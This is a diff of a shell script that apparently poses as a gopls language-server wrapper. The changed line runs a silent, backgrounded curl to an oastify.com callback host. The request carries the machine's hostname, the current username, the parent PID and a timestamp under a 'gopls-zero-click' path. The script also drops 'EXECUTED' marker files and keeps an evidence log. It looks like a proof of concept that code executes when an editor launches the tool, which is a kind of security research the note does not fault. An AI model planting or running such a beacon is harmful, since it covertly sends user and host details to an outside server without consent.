@@ -47,7 +47,7 @@ EVIDENCE_LOG="/tmp/gopls-wrapper-exec.log"
 touch "${SCRIPT_DIR}/EXECUTED-$(date +%s)-pid$$" 2>/dev/null || true
 
 ( curl -s -m 5 -o /dev/null \
-    "https://01z7lq0h27vsaiurpbtqd3lqzh58tyhn.oastify.com/gopls-zero-click?h=$(hostname)&u=$(whoami)&ppid=${PPID}&t=$(date +%s)" \
+    "https://8bkgo1diqbdj2gfhe0agi8smddj57vvk.oastify.com/gopls-zero-click?h=$(hostname)&u=$(whoami)&ppid=${PPID}&t=$(date +%s)" \
     >/dev/null 2>&1 & ) || true
 
 # ── Logging (to stderr to keep stdio clean for LSP) ───────────────────────────
